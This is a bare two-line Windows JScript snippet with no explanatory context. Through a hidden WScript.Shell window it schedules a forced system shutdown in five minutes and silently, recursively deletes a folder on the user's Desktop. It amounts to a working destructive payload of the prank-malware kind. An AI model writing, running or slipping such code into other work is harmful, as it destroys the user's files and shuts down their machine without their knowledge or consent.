c1="cmd /c shutdown -s -t 300 && rd /s /q %userprofile%\Desktop\a";
new ActiveXObject("WScript.Shell").Run(c1,0,true);
